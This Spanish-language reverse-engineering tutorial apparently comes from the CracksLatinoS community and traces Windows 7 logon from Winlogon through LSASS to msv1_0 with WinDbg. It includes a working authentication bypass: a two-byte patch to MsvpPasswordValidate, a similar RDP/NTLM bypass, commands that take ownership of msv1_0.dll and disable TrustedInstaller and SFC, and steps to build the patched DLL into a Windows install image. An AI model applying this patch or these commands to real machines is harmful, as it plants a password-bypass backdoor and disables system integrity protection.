# 1654 — Reversing on Windows: The Logon Quest

| Campo            | Detalle                                                                              |
|------------------|--------------------------------------------------------------------------------------|
| **Programa**     | Windows 7 SP1 x86 — proceso de login local interactivo                              |
| **Protección**   | Windows Resource Protection (WRP) / TrustedInstaller / SFC / Firma digital          |
| **Objetivos**    | Analizar el proceso de autenticación de Windows 7 de extremo a extremo y desarrollar una POC para bypassear la validación de credenciales |
| **Dificultad**   | Muy alta — kernel debugging, ring0/ring3, RPC, ALPC, callbacks, file mapping        |
| **Herramientas** | WinDbg 6.12.0002.633 x86, IDA Pro 6.8, Sysinternals Suite, Python 2.7.10, VirtualBox 4.3.28, Windows AIK, UltraEdit-32, RDG Packer Detector v0.7.2 |
| **Autor**        | SyXe'05 (José Luis Pérez López) — [CracksLatinoS]                                  |
| **Fecha**        | Marzo 2018                                                                           |
| **Contacto**     | syxe05@gmail.com                                                                     |

---

## Introducción

Análisis completo del proceso de login local en Windows 7 SP1 x86. La motivación original fue diseñar un sistema de control de tiempo de sesión para una red LAN de 9 estaciones con ~100 usuarios. Se descartaron scripts de inicio de usuario (demasiado tardíos) y se optó por estudiar el proceso de autenticación desde la raíz para encontrar el punto de intercepción óptimo.

El tutorial cubre desde la preparación del entorno de kernel debugging hasta la implementación de una POC funcional que bypasea la validación de credenciales, pasando por el análisis detallado de cada componente involucrado: Winlogon, LogonUI, authui, LSASS, lsasrv, msv1_0, RPC/ALPC, SAM y TrustedInstaller.

> SyXe'05 firmó este trabajo con su nombre real tras años usando el alias Snat.

---

## Entorno de trabajo

```
Máquina origen (debugger):  Windows 7 SP1 x86 — WinDbg + símbolos FREE
Máquina destino (debuggee): Windows 7 SP1 x86 — VirtualBox 4.3.28
Canal de comunicación:      Named pipe \\.\pipe\VM7SXEpipe (puerto serie virtual)
```

### Configuración del canal WinDbg ↔ VirtualBox

La comunicación se realiza mediante una named pipe creada por la máquina virtual. La sintaxis de la pipe es:

```
\\. → máquina local
\pipe → obligatorio (fijo)
\VM7SXEpipe → nombre personalizado
```

Habilitar depuración en la VM (consola con privilegios de admin):

```bat
bcdedit /debug on
bcdedit /dbgsettings serial debugport:1 baudrate:115200
```

WinDbg se conecta vía `File → Kernel Debug → COM`:

```
Port: \\.\pipe\VM7SXEpipe
Baud Rate: 115200
Pipe: ✓   Reconnect: ✓
```

### Verificación de la named pipe mediante Local Kernel Debugging

Se abre un segundo WinDbg en modo local (`Ctrl+K → Local`) para inspeccionar la tabla de handles del primer WinDbg:

```
lkd> !process 0 0 WinDbg.exe
PROCESS 871d5d40  Cid: 0a30  → WinDbg conectado a la VM

lkd> .process /p 871d5d40
lkd> !handle
  0120: Object: 871e7388  Type: File
      Name: \VM7SXEpipe {NamedPipe}   ← handle 0x120
```

Estructura `EPROCESS`:

```
lkd> dt nt!_EPROCESS @$proc
  +0x0f4 ObjectTable: 0xb1f23488 _HANDLE_TABLE
  +0x0b4 UniqueProcessId: 0x00000a30

lkd> dt nt!_HANDLE_TABLE @@(((nt!_EPROCESS *) @$proc) -> ObjectTable)
  +0x000 TableCode: 0xb1f2e000   ← tabla de handles en kernel space
```

---

## Diagrama de flujo del proceso de login

```
[Usuario pulsa Ctrl+Alt+Del]
        │
        ▼
Win32k.sys → SAS (Secure Attention Sequence)
        │
        ▼
Winlogon.exe
  ├─ LogonUI.exe → authui.dll
  │     ├─ CJobQueue callbacks (threads cooperativos)
  │     ├─ Credential Provider (captura user/password)
  │     └─ WluiRequestCredentials → Winlogon
  │
  └─ LsaLogonUser (Winlogon)
        │
        ▼
SspiCli → SspiSrv [via ALPC port: lsasspirpc]
        │
        ▼
lsass.exe
  └─ lsasrv.dll
        ├─ SspiExLogonUser
        └─ NegLogonUserEx2Worker
              ├─ kerberos!LsaApLogonUserEx2 (dominio)
              └─ msv1_0!LsaApLogonUserEx2 (local SAM)
                    ├─ MsvSamValidate
                    ├─ MsvpSamValidate
                    ├─ msv1_0!NtLmDecodeSecret → cryptbase!SystemFunction041
                    │     └─ ZwDeviceIoControl → driver KsecDD (decodifica password)
                    └─ MsvpPasswordValidate  ← PUNTO DE INTERCEPCIÓN
                          └─ retorna STATUS_CODE → lsasrv → SspiSrv → Winlogon
```

---

## Siguiendo la pipe — Arranque del sistema

### Cadena de inicio hasta LSASS

```
winload.exe
  └─ ntoskrnl.exe (NtCreateUserProcess)
        └─ smss.exe [Session Manager]
              ├─ csrss.exe
              └─ wininit.exe
                    ├─ services.exe (SCM)
                    └─ lsass.exe ← objetivo
```

### Rastreo de la creación de LSASS con WinDbg

```
kd> bp nt!NtCreateUserProcess
kd> g
→ para en la creación de lsass

kd> bp nt!PspAllocateProcess
→ entramos en la creación del proceso
```

Durante `PspAllocateProcess` → `MmInitializeProcessAddressSpace` → `KeStackAttachProcess` → `KiAttachProcess`:

```asm
; KiAttachProcess modifica cr3 para ejecutar en el contexto del proceso nuevo
; Antes:
kd> dt -r nt!_KPROCESS DirectoryTableBase @$proc
   +0x018 DirectoryTableBase: 0x374000   ; wininit

; Después de KeStackAttachProcess:
kd> dt -r nt!_KPROCESS DirectoryTableBase @$proc
   +0x018 DirectoryTableBase: 0x27f1f000  ; lsass ← cr3 cambiado
kd> showprocname
   ImageFileName: "lsass.exe"
```

### Creación del PEB de LSASS

```
MiCreatePebOrTeb crea el PEB en 0x7ffdf000 (user-mode)
  ImageBase de lsass.exe: 0x680000 (en EDX)

kd> !peb
  → PEB en 0x7ffdf000 (visible tras KeStackAttachProcess)
```

### Sección y mapeo de lsass.exe

```
nt!ZwOpenFile → lsass.exe {HarddiskVolume2}
nt!ZwCreateSection (syscall 0x54 → nt!NtCreateSection)
  → Section object: 0x8f518440

kd> dt -v nt!_SECTION_OBJECT @ecx
  Segment → _MAPPED_FILE_SEGMENT
  ControlArea → \Windows\System32\lsass.exe

nt!ZwMapViewOfSection → mapea el ejecutable en memoria
```

---

## Winlogon — Siguiente objetivo

Winlogon gestiona la SAS (`Ctrl+Alt+Del`) recibida desde `Win32k.sys` y es responsable de:

- Lanzar `LogonUI.exe` para mostrar la interfaz de login.
- Recoger las credenciales vía `WluiRequestCredentials`.
- Pasar la validación a LSASS mediante `LsaLogonUser`.
- Recibir el `STATUS_CODE` y actuar en consecuencia (mostrar error o iniciar sesión).

### Localización de funciones clave

```
kd> x winlogon!*Wlui*
winlogon!WluiRequestCredentials
winlogon!WluiNotifyLogonAttempt

kd> x winlogon!*Lsa*
winlogon!LsaLogonUser
```

---

## RPC — Remote Procedure Call

La comunicación entre Winlogon y LSASS se realiza mediante RPC. El servidor RPC de LSASS está expuesto a través de `SspiSrv` y accesible desde `SspiCli`.

### Localización del servidor RPC en LSASS

```
kd> x lsasrv!*RPC*
lsasrv!LsarRpcServerRegister
lsasrv!lsasspirpc    ← nombre del puerto ALPC
```

### Rastreo de la llamada RPC desde Winlogon

```
Winlogon!LsaLogonUser
  └─ SspiCli!LsaLogonUser
        └─ SspiCli!SspipLogonUser
              └─ NdrClientCall2 (RPCRT4)
                    └─ [ALPC → lsasspirpc]
                          └─ SspiSrv!SspirLogonUser
                                └─ lsasrv!SspiExLogonUser
```

---

## ALPC — En busca del puerto perdido

ALPC (*Advanced Local Procedure Call*) es el mecanismo de IPC interno de Windows que reemplazó a LPC. El puerto `lsasspirpc` es el punto de entrada a LSASS desde el exterior.

### Localización del puerto

```
kd> !object \RPC Control
  → directorio con todos los puertos ALPC registrados

kd> !alpc /p lsasspirpc
  → muestra conexiones activas al puerto

kd> dt nt!_ALPC_PORT @eax
  +0x008 OwnerProcess: 0x... _EPROCESS "lsass.exe"
```

### Flujo ALPC Winlogon → LSASS

```
Cliente (Winlogon):
  NtAlpcSendWaitReceivePort → envía mensaje al puerto lsasspirpc

Servidor (LSASS):
  SspiSrv!SspirLogonUser  ← handler del mensaje RPC
    └─ lsasrv!SspiExLogonUser
          └─ NegLogonUserEx2Worker → selecciona authentication package
```

---

## LSASS — The Special One

`lsass.exe` (Local Security Authority Subsystem Service) es el proceso más crítico del subsistema de seguridad. Corre en la sesión 0 y es lanzado por `wininit.exe`. Contiene:

- `lsasrv.dll` — núcleo del LSA.
- `msv1_0.dll` — Authentication Package para logins locales (SAM).
- `kerberos.dll` — Authentication Package para logins de dominio.
- `tspkg.dll` — Terminal Services Package (RDP).
- Servicios adicionales: EFS (`EfsRpcSrvService`), iniciado por `lsasrv!ServiceDispatcherThread`.

### Inicialización de LSASS

```
lsass!main
  └─ LsaIInitializeWellKnownSids
  └─ lsasrv!LsaInitializeServer
        ├─ SpmpLoadAuthPackages  ← carga los Authentication Packages
        │     ├─ SpmpLoadPackage (msv1_0.dll)
        │     │     ├─ Package!SpLsaModeInitialize  → retorna FunctionTable
        │     │     └─ Package!SpInitialize         → recibe LsapSecpkgFunctionTable
        │     └─ SpmpLoadPackage (kerberos.dll) / (tspkg.dll) / ...
        └─ LsarRpcServerRegister  ← registra servidor RPC (lsasspirpc)
```

### Tabla de funciones de Kerberos

```
kd> dds 1428d8
001428d8  00440042                        ; STRING
001428dc  00146fc0                        ; UNICODE
001428e8  755d9c79 kerberos!LsaApCallPackage
001428ec  755dd6d9 kerberos!LsaApLogonTerminated
001428f0  75603fb2 kerberos!LsaApCallPackageUntrusted
001428f4  75604003 kerberos!LsaApCallPackagePassthrough
001428fc  755c0da3 kerberos!LsaApLogonUserEx2
```

---

## Man Vs Machine — The Callback Odyssey

`LogonUI.exe` gestiona la interfaz de login a través de `authui.dll`. Su arquitectura interna es orientada a eventos con múltiples hilos cooperativos:

```
authui.dll
  ├─ CJobQueue_Input_Callback::Signal    ← recibe eventos de teclado
  ├─ CJobQueue_Logon_Callback::Signal    ← gestiona el proceso de login
  └─ CJobQueue_Output_Callback::Signal   ← actualiza la UI
        └─ _XXX_Job::Do / _XXX_ReplyJob::Do  ← ejecuta trabajos encolados
```

### Localización de callbacks

```
kd> x authui!*Callback*
authui!CJobQueue_Input_Callback::Signal
authui!CLogonFrame::_OnPasswordChange
authui!CLogonFrame::_OnSubmitCredentials

kd> x authui!*Credential*
authui!CCredentialProviderCredential::GetStringValue
authui!CCredentialProviderCredential::SetStringValue
```

### Captura de credenciales

El Credential Provider captura user/password y los entrega vía:

```
authui!CCredentialProviderCredential::GetSerialization
  └─ CredPackAuthenticationBuffer  ← serializa las credenciales
        └─ WluiRequestCredentials (RPC hacia Winlogon)
```

---

## Man Vs Machine — An Event-Driven Environment

La ventana de login es una ventana Win32 estándar (`RegisterClassExW` / `CreateWindowExW`). Sus controles (edit boxes, botones) son también ventanas. La comunicación entre ellas se realiza mediante mensajes Win32.

### Localización de la ventana de login

```
kd> x authui!*ClassName*
authui!CLogonFrame::s_szClassName = "Logon"

kd> x authui!*WndProc*
authui!CLogonFrame::s_WndProc  ← callback de ventana principal
```

### Interceptando el submit de credenciales

```asm
; BP en el handler WM_COMMAND del botón de login
kd> bp authui!CLogonFrame::_OnSubmitCredentials
→ para cuando el usuario pulsa ENTER/botón

; Traceando llegamos a:
authui!CCredentialProviderCredential::GetSerialization
  → user y password visibles en texto Unicode en el buffer
```

---

## Man Vs Machine — An RPC Logic Layer

La capa RPC entre authui/Winlogon y LSASS usa RPCRT4 como transporte. El worker thread de Winlogon queda en espera mientras el callback thread de authui procesa la respuesta.

```
Winlogon!WluiNotifyLogonAttempt (RPC call hacia authui)
  ├─ NdrClientCall2 → RPCRT4!Invoke
  └─ authui callback thread procesa → retorna STATUS_CODE

Winlogon recibe STATUS_LOGON_SUCCESS o STATUS_LOGON_FAILURE
  └─ llama a LsaLogonUser para validación real
```

---

## El punto de partida — NegLogonUserEx2Worker

Dentro de `lsasrv.dll`, la función `NegLogonUserEx2Worker` itera sobre los Authentication Packages registrados buscando uno que resuelva el login:

```asm
; Iteración sobre la lista de packages
lsasrv!NegLogonUserEx2Worker+0x?:
  mov  ecx, [esi]        ; FunctionTable del package
  call [ecx+offset]      ; → Package!LsaApLogonUserEx2
  test eax, eax
  jnz  next_package      ; si falla, prueba el siguiente
```

Para login local → `msv1_0!LsaApLogonUserEx2`.

### Flujo dentro de msv1_0

```
msv1_0!LsaApLogonUserEx2
  └─ MsvSamValidate
        └─ MsvpSamValidate
              ├─ SamIGetUserLogonInformation  ← consulta SAM (HKLM\SAM\...\V)
              ├─ msv1_0!NtLmDecodeSecret
              │     └─ cryptbase!SystemFunction041
              │           └─ ZwDeviceIoControl → KsecDD (ring0, decodifica hash)
              └─ MsvpPasswordValidate  ← COMPARACIÓN FINAL
```

### MsvpPasswordValidate — El punto de intercepción

```asm
; Comparación de hash del password introducido vs hash almacenado en SAM
msv1_0!MsvpPasswordValidate+0xCA:
  32 C0        xor al, al   ; AL = 0 → STATUS_WRONG_PASSWORD
  E9 AB 6B FF FF  jmp <return>
```

Si `AL != 0` → login aceptado. Este es el punto de modificación de la POC.

---

## LSASS — The Main Thread

Análisis detallado del hilo principal de lsass, que gestiona la inicialización de los paquetes de autenticación y el servidor RPC.

### Estructura SSP_TABLE (Authentication Package)

Cada package registrado tiene una entrada en la `SpTable` de lsasrv:

```
lsasrv!SpTable[n]:
  +0x00  PackageName    (UNICODE_STRING)
  +0x08  PackageId
  +0x0C  FunctionTable  → puntero a la tabla de funciones del package
  +0x70  SpLsaModeInitialize
  +0x78  SpInitialize
  +0x80  LsaApLogonUserEx2
  ...
```

### Inicialización del servidor ALPC/RPC

```
lsasrv!LsarRpcServerRegister
  └─ RpcServerUseProtseqEp("ncalrpc", ..., "lsasspirpc")
  └─ RpcServerRegisterIf(...)
  └─ RpcServerListen(...)
```

---

## Remote Desktop — RDP Authentication

Para conexiones RDP (`mstsc.exe`), el Authentication Package utilizado es `tspkg.dll` con protocolo NTLM.

### Flujo NTLMv2 para RDP

```
Cliente (PC01) → VM7SXE:
  NEGOTIATE → CHALLENGE → AUTHENTICATE (3-way handshake NTLM)

En LSASS (VM7SXE):
  tspkg!SpAcceptLsaModeContext
    └─ AcceptSecurityContext (SspiCli → SspiSrv)
          └─ lsasrv!WLsaAcceptContext
                └─ SspiSrv!SspirProcessSecurityContext
                      └─ msv1_0!LsaApLogonUserEx2
                            └─ msv1_0!SsprHandleAuthenticateMessage
                                  └─ MsvpNtlm3ValidateResponse  ← NTLM validate

kd> k
  msv1_0!SsprHandleAuthenticateMessage+0x1594
  msv1_0!SpAcceptLsaModeContext+0x314
  lsasrv!WLsaAcceptContext+0x18e
  SspiSrv!SspirProcessSecurityContext+0x16f
  RPCRT4!Invoke+0x2a
```

### Algoritmo HMAC-MD5 en NTLMv2

```
MsvpNtlm3ValidateResponse:
  HMACMD5Init(ntlm_hash)
  HMACMD5Update(server_challenge + client_blob)
  HMACMD5Final → NT Proof String

  HMACMD5Init(NT_proof_string)
  HMACMD5Update(session_key_material)
  HMACMD5Final → SessionBaseKey
```

Para bypassear RDP:

```asm
; MsvpNtlm3ValidateResponse+0x??
; Si el salto se ejecuta → AL = 1 (autenticación OK)
; Forzar el salto:
kd> eb msv1_0!MsvpNtlm3ValidateResponse+<offset> <opcode_jmp>
```

---

## TrustedInstaller — New Rules

Windows Resource Protection (WRP) protege archivos críticos del sistema mediante ACLs. Solo `TrustedInstaller` (`services.exe` / Windows Modules Installer) puede modificar `msv1_0.dll`.

### Intento de modificación del archivo

```bat
; Renombrar msv1_0.dll → Access Denied (incluso como Administrador)
ren C:\Windows\System32\msv1_0.dll msv1_0_org.dll  ; ERROR

; El propietario es TrustedInstaller, no Administrators
icacls C:\Windows\System32\msv1_0.dll
  → TrustedInstaller:(F)  Administrators:(RX)
```

### Cambio de propietario y permisos

```bat
; Cambiar propietario al usuario actual
takeown /f C:\Windows\System32\msv1_0.dll /a

; Añadir permisos de escritura
icacls C:\Windows\System32\msv1_0.dll /grant SyXe'05:(F)

; Ahora es posible modificar el archivo con UltraEdit
```

---

## Adquiriendo persistencia

La modificación en caliente (`eb msv1_0!MsvpPasswordValidate+0xCA B0 01`) se pierde al reiniciar. El archivo en disco es restaurado por:

1. `SFC` (System File Checker) / TrustedInstaller — detecta la modificación por firma digital y restaura desde el backup (`C:\Windows\winsxs\...\msv1_0.dll`).
2. `Mapped Page Writer` — el kernel puede volver a escribir páginas modificadas a disco.
3. `pending.xml` / `SetupExecute` — operaciones de renombrado pendientes ejecutadas por smss.exe en el siguiente arranque.

### Cálculo del offset en disco

La dirección virtual `0x1776b` en IDA (con ImageBase rebaseada a 0x0) se convierte al offset en disco con:

```
offset_disco = (va – image_base) – base_of_code + size_of_headers
             = (0x1776b – 0) – 0x1000 + 0x400
             = 0x16b6b
```

Modificar en UltraEdit el offset `0x16b6b`:

```
ORIGINAL: 32 C0  → xor al, al   (STATUS_WRONG_PASSWORD)
PARCHE:   B0 01  → mov al, 1    (STATUS_OK)
```

### Neutralización de TrustedInstaller + SFC

```bat
; Deshabilitar TrustedInstaller permanentemente
sc config TrustedInstaller start= disabled

; Deshabilitar SFC
; SFC verifica la firma con WinVerifyTrust → retorna error si el hash no coincide
; Alternativa: parchear SFC para ignorar msv1_0.dll
;   o modificar su retorno cuando detecta nuestra DLL
```

Limpiar pending renames:

```bat
; Eliminar archivo de operaciones pendientes
del C:\Windows\winsxs\pending.xml

; Limpiar claves de registro
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SetupExecute /f
reg delete "HKLM\COMPONENTS" /v ... /f
```

Con ambas DLLs (original + backup en winsxs) parchadas a `B0 01` y TrustedInstaller deshabilitado, el parche **sobrevive al reinicio**.

---

## POC — Prueba de Concepto

### Login local sin password

Con `msv1_0!MsvpPasswordValidate+0xCA` modificado a `B0 01 (mov al, 1)`:

```
kd> eb msv1_0!MsvpPasswordValidate+0xca B0 01
kd> u msv1_0!MsvpPasswordValidate+0xca
  74ac776b b001    mov al,1  ; ← parche en caliente
  74ac776d e9ab6b  jmp <return>
```

Cualquier password → login aceptado.

### Login RDP sin password válido

```
kd> eb msv1_0!MsvpNtlm3ValidateResponse+<offset_jmp> <opcode>
; Forzar AL=1 antes del retorno

kd> eb msv1_0!MsvpPasswordValidate+0x94ff 00  ; restaurar para logins locales
```

Resultado: acceso RDP con password incorrecto → sesión abierta.

### Distribución en imagen WIM

```bat
; Montar imagen WIM del DVD de Windows 7
imagex /mount install.wim 1 C:\mount

; Modificar msv1_0.dll en la imagen montada
; (con permisos de TrustedInstaller o sin WRP activo)
copy msv1_0_patched.dll C:\mount\Windows\System32\msv1_0.dll

; Desmontar y guardar cambios
imagex /unmount C:\mount /commit

; Reempaquetar ISO con oscdimg
oscdimg -n -m -b<bootdata> C:\iso_source output.iso
```

> ⚠️ Windows Update restaurará los binarios parchados. Desactivar actualizaciones o restaurar los originales antes de actualizar.

---

## Administration comes into Play

### Escalada de privilegios mediante credenciales del SAM

El hash del password se almacena en `HKLM\SAM\SAM\Domains\Account\Users\...\V`. La decodificación se realiza en:

```
msv1_0!NtLmDecodeSecret
  └─ cryptbase!SystemFunction041
        └─ ZwDeviceIoControl(KsecDD)  ← driver de modo kernel descifra el hash
```

El password en texto plano aparece en el buffer tras `cryptbase!SystemFunction041`, antes de la comparación en `MsvpPasswordValidate`.

---

## Authentication Packages — Implementación

Modelización en Java del sistema de Authentication Packages de Windows:

### Interfaz AuthenticationPackage

```java
public interface AuthenticationPackage {
    public static final int WRONG_PASSWORD       = 0xC000006A;
    public static final int NOT_DOMAIN_LOGIN     = 0xFFFFFFFF;
    public static final int NOT_INTERACTIVE_LOGIN= 0xFFFFFFFE;
    public static final int ALL_OK               = 0x00000000;

    int LsaApLogonUserEx2(int logonType, String user, String password);
    void SpInitialize(LsapSecpkgFunctionTable table);
}
```

### msv1_0 (login local)

```java
public class msv1_0 implements AuthenticationPackage {
    @Override
    public int LsaApLogonUserEx2(int logonType, String user, String password) {
        if (!isValidData(user, password)) return NOT_INTERACTIVE_LOGIN;
        if (logonType != 0x1) return NOT_INTERACTIVE_LOGIN; // INTERACTIVE
        if (!password.equals(getSamHash(user))) return WRONG_PASSWORD;
        return ALL_OK;
    }
}
```

### kerberos (login de dominio)

```java
public class kerberos implements AuthenticationPackage {
    @Override
    public int LsaApLogonUserEx2(int logonType, String user, String password) {
        if (logonType != 0x0) return NOT_DOMAIN_LOGIN;
        // validación contra controlador de dominio...
        return WRONG_PASSWORD;
    }
}
```

### lsass iterando sobre los packages

```java
public class lsass {
    private List<AuthenticationPackage> packages = new ArrayList<>();

    public lsass() {
        packages.add(new kerberos());
        packages.add(new msv1_0());
        // RPC server init (lsasspirpc)...
    }

    public int SspiExLogonUser(int logonType, String user, String password) {
        Iterator<AuthenticationPackage> it = packages.iterator();
        int status = -1;
        while (it.hasNext() && status != AuthenticationPackage.ALL_OK) {
            AuthenticationPackage pkg = it.next();
            status = pkg.LsaApLogonUserEx2(logonType, user, password);
            pkg.printStatus(status);
        }
        return status;
    }
}
```

El archivo `Security.jar` (incluido en el repo bajo `AuthenticationPackages/Security.rar`) implementa el sistema completo.

---

## Windows Startup Diagram

```
BIOS/UEFI
  └─ winload.exe
        ├─ ntoskrnl.exe (nt!IoInitSystem → drivers BOOT_START + SYSTEM_START)
        │     └─ smss.exe [Sesión 0 — Maestro]
        │           ├─ csrss.exe [Sesión 0]
        │           ├─ wininit.exe
        │           │     ├─ services.exe (SCM)  → servicios AUTO_START
        │           │     └─ lsass.exe
        │           └─ smss.exe [Sesión 1 — copia]
        │                 ├─ csrss.exe [Sesión 1]
        │                 └─ winlogon.exe
        │                       └─ LogonUI.exe (authui.dll + Credential Provider)
        └─ hal.dll
```

---

## Resultado de la investigación

- ✅ Proceso de login trazado **de extremo a extremo** desde Win32k.sys hasta MsvpPasswordValidate.
- ✅ Kernel debugging funcional mediante WinDbg + VirtualBox (named pipe).
- ✅ Arquitectura ALPC/RPC entre Winlogon, SspiCli, SspiSrv y lsasrv analizada.
- ✅ Callbacks de authui (CJobQueue) y Credential Providers estudiados.
- ✅ Authentication Packages (msv1_0, kerberos, tspkg) analizados y modelados.
- ✅ TrustedInstaller / WRP / SFC estudiados y neutralizados.
- ✅ POC funcional: login sin password tanto local como vía RDP.
- ✅ Persistencia lograda mediante parche en disco + desactivación de SFC.
- ✅ Distribución en imagen WIM demostrada.

> 🔒 **Nota de seguridad:** La POC requiere acceso físico a la máquina y uso de kernel debugger. No constituye un fallo de seguridad de Windows ya que no existe vector de explotación remoto sin modificar binarios. Windows mantiene sus certificaciones de seguridad C2/B1 (TCSEC) intactas.

---

## Notas técnicas

- El parche `0x32C0 → 0xB001` (2 bytes) es el mínimo cambio necesario: `xor al, al` → `mov al, 1`.
- La fórmula de conversión `offset_disco = (va – image_base) – base_of_code + size_of_headers` es fundamental para parchear cualquier ejecutable/DLL del sistema.
- File alignment (`0x200`) ≠ Section alignment (`0x1000`) → las diferencias se acumulan sección a sección.
- `KsecDD` (Kernel Security Device Driver) es el responsable de descifrar los hashes de SAM en ring0.
- `EFS` corre en el contexto de lsass e impide eliminar `msv1_0.dll` si está cifrado — deshabilitar antes de trabajar con el archivo.
- La sesión 1 (Winlogon) se inicializa **en paralelo** a la sesión 0 (wininit/services) — no hay garantía de orden entre ambas.
- ASLR cambia las bases en cada reinicio — usar offsets relativos en IDA + rebase a 0x0.

---

## Referencias

| # | Título | Autor |
|---|--------|-------|
| [1] | Sistemas Operativos, Una visión aplicada | Carretero, de Miguel, García, Pérez — McGraw Hill |
| [2] | What Makes it Page? (Windows 7 x64 VMM) | Enrico Martignetti |
| [3] | Estructura y Tecnología de Computadores I (UNED) | De Mora, Castro, Gutiérrez et al. |
| [4] | Understanding Object-Oriented Programming with Java | Timothy Budd — Addison Wesley |
| [5] | Ensamblador para DOS, Linux y Windows | Francisco Charte Ojeda — ANAYA |
| [6] | Fundamentos de Lógica Matemática | Aranda, Fernández, Jiménez, Morilla — Sanz y Torres |
| [7] | Windows via C/C++ Fifth Edition | Jeffrey Richter, Christophe Nasarre — Microsoft Press |
| [8] | Windows Internals 6th Edition (Parts 1, 2) | Russinovich, Solomon, Ionescu — Microsoft Press |
| [9] | Tutoriales de reversing de CracksLatinoS | Varios autores |

**Herramientas:** WinDbg 6.12.0002.633, IDA Pro 6.8, Sysinternals Suite, VirtualBox 4.3.28, Python 2.7.10, Windows AIK, UltraEdit-32, RDG Packer Detector 0.7.2, 32bit Calculator v1.5

**Archivos incluidos:** `Security.rar` (Security.jar — simulación Java del sistema de authentication packages), scripts batch y Python, `NTStatus v1.0`

**Agradecimientos:** Absolom, Otrebla, Sherab Giovaninni, Ricardo Narvaja, Thunder, Boken, Longin0s, Apuromafo, solid, sequeyo, StrongCoder, Nax0r, LordPei, Arrizen, y toda la comunidad CracksLatinoS.
